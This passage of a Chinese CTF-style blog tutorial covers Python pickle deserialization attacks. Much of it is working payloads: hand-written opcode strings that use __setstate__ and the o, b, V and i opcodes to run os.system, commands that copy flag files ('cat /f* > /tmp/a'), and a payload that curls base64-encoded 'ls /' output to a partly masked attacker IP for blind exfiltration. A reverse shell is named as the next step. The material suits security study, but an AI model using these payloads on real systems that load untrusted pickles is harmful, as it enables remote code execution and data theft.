<p>　　它有什么安全隐患呢？我们来想想看：<code>Student</code>原先是没有<code>__setstate__</code>这个方法的。那么我们利用<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来BUILE这个对象，那么现在对象的<code>__setstate__</code>就变成了<code>os.system</code>；接下来利用<code>&quot;ls /&quot;</code>来再次BUILD这个对象，则会执行<code>setstate(&quot;ls /&quot;)</code> ，而此时<code>__setstate__</code>已经被我们设置为<code>os.system</code>，因此实现了RCE.</p>
<p>　　payload构造如下：</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-5f6f6661a916b296e3fac6fbed8427cc_1440w.jpg" alt="img"></p>
<p>　　执行结果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-44a237be1ffe80cf2969d217831fe5dd_1440w.jpg" alt="img"></p>
<p>　　成功RCE！接下来可以通过反弹shell来控制靶机了。</p>
<p>　　有一个可以改进的地方：这份payload由于没有返回一个Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常Student进栈。payload构造如下：</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-fd188e8d3e3f341d719019b7e869bf9d_1440w.jpg" alt="img"></p>
<p>绿色框内为恶意代码</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-d5b6e15f6b0506689952cf0e8f93691f_1440w.jpg" alt="img"></p>
<p>　　没有抛出异常。</p>
<p>　　<strong>至此，我们完成了不使用<code>R</code>指令、无副作用的RCE。</strong></p>
<p>除此之外，其实我们还是可以通过一些其他类似的漏洞方法来打rce</p>
<pre><code class="highlight python">__reduce_ex__()
__setstate__()</code></pre>

<p>实例</p>
<pre><code class="highlight plaintext">#__setstate__:
import pickle
import pickletools
import os
class obj:
   def __init__(self,str1,str2):
      self.str1=str1;
      self.str2=str2;
   def __setstate__(self,name):
        os.system(&#x27;dir&#x27;)
#    def __reduce__(self):
#       return(os.system,(&#x27;dir&#x27;,))
class1=obj(&quot;str1&quot;,&quot;str2&quot;)
a=pickle.dumps(class1)      
print(a)
b=a
pickle.loads(b)

#setstate
</code></pre>

<h4 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h4><p>　　<strong>一</strong>、<strong>其他模块的load也可以触发pickle反序列化漏洞。</strong>例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p>
<p>　　二、即使代码中没有<code>import os</code>，**GLOBAL指令也可以自动导入<code>os.system</code>**。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p>
<p>　　三、<strong>即使没有回显，也可以很方便地调试恶意代码。</strong>只需要拥有一台公网服务器，执行<code>os.system(&#39;curl your_server/</code>ls &#x2F; | base64<code>)</code>，然后查询您自己的服务器日志，就能看到结果。这是因为：以&#96;&#96;&#96;引号包含的代码，在sh中会直接执行，返回其结果。</p>
<p>　　下面给出一个例子：</p>
<pre><code class="highlight text">payload  = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-f60a5ad59d548b1ca78b839320318dfe_1440w.jpg" alt="img"></p>
<p>payload</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-377763e71f5d198566d7b40e418289f8_1440w.jpg" alt="img"></p>
<p>pickle.loads()效果</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-0c450bc39b3ce69cdf14486ed14752c1_1440w.jpg" alt="img"></p>
<p><code>pickle.loads()</code>时，<code>ls /</code>的结果被base64编码后发送给服务器（红框）；我们的服务器查看日志，就可以得到命令执行结果。因此，在没有回显的时候，我们可以通过<code>curl</code>把执行结果送到我们的服务器上。</p>
<p>　　上文发出去的请求缺了一段，是因为url没有加引号。</p>
<p>GLOBAL操作符</p>
<pre><code class="highlight plaintext">GLOBAL操作符读取全局变量，是使用的find_class函数。而find_class对于不同的协议版本实现也不一样。总之，它干的事情是“去x模块找到y”，y必须在x的顶层（也即，y不能在嵌套的内层）</code></pre>

<h3 id="手搓opcode"><a href="#手搓opcode" class="headerlink" title="手搓opcode"></a>手搓opcode</h3><p>只要会自己写opcode事情就简单多了。把。</p>
<ol>
<li>o指令绕过</li>
</ol>
<pre><code class="highlight plaintext">payload1 = b&#x27;&#x27;&#x27;(cos
system
S&#x27;cat /f* &gt; /tmp/a&#x27;
o.&#x27;&#x27;&#x27;</code></pre>

<blockquote>
<p>先是用 ( 入栈一个MARK，然后用 c 导入os.system()函数入栈，然后用 S 定义字符串并入栈，最后用 o <strong>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数，</strong>结果是os.system(cat &#x2F;f* &gt; &#x2F;tmp&#x2F;a’o)， 点号是结束的意思</p>
</blockquote>
<ol start="2">
<li>b指令绕过</li>
</ol>
<pre><code class="highlight plaintext">payload2 =(c__main__
User
o&#125;(S&quot;\x5f\x5f\x73\x65\x74\x73\x74\x61\x74\x65\x5f\x5f&quot; //__setstate__
cos
system
ubS&quot;cat /ffl14aaaaaaagg&gt;/tmp/gkjzjh146&quot;
b.</code></pre>

<p>3.s指令绕过</p>
<p>如果<code>&#39;</code>或者<code>&quot;</code>被ban了的话怎么办捏，可以用V来代替</p>
<pre><code class="highlight plaintext">S&#x27;ls&#x27;
和
Vls
是一样的效果</code></pre>

<p>4.i一把梭</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
opcode=<span class="string">b&#x27;&#x27;&#x27;(Vls</span>
<span class="string">ios</span>
<span class="string">system</span>
<span class="string">.&#x27;&#x27;&#x27;</span>
pickle.loads(opcode)</code></pre>

<p>直接代替了c和o的功能</p>
]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
</search>
